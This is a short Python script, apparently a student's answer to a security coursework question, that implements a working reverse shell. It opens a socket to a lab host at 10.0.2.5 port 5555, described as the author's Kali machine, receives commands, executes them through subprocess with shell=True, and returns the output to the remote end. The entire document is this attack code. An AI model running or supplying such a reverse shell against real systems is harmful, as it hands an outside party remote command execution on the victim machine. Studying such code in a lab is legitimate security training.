# Question 1
# Chow Keiren 7233450

import socket
import subprocess

stop_connection = "false"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.2.5", 5555)) # 10.0.2.5 is my Kali IP
s.send(b"Connected!\n")
s.send(b"Enter True to stop connection\n")

while stop_connection != b"true\n": # to stop connection
   s.send(b"Enter any command: ")
   data_received = s.recv(1024)
   end_result = subprocess.check_output(data_received, shell = True)
   stop_connection = data_received
   s.send(end_result)
s.close()

